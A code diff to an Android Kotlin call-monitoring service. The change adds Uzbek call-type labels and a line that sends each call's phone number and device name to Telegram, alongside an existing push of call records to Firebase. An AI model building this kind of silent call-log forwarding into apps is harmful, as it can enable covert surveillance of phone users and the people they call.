@@ -39,9 +39,16 @@ class CallWatcherService : Service() {
                         wasRinging -> "missed"
                         else -> null
                     }
-                    if (type != null) {
+                                        if (type != null) {
                         val device = DevicePrefs.getDeviceName(applicationContext)
                         FirebaseHelper.pushCall(lastNumber, type, callStartTime, durationSec, device)
+                        val typeLabel = when (type) {
+                            "incoming" -> "Kirgan qo'ng'iroq"
+                            "outgoing" -> "Chiqgan qo'ng'iroq"
+                            "missed" -> "O'tkazib yuborilgan qo'ng'iroq"
+                            else -> type
+                        }
+                        TelegramHelper.send("📞 $typeLabel ($device)\nRaqam: $lastNumber")
                     }
                     wasRinging = false
                     wasOffHook = false
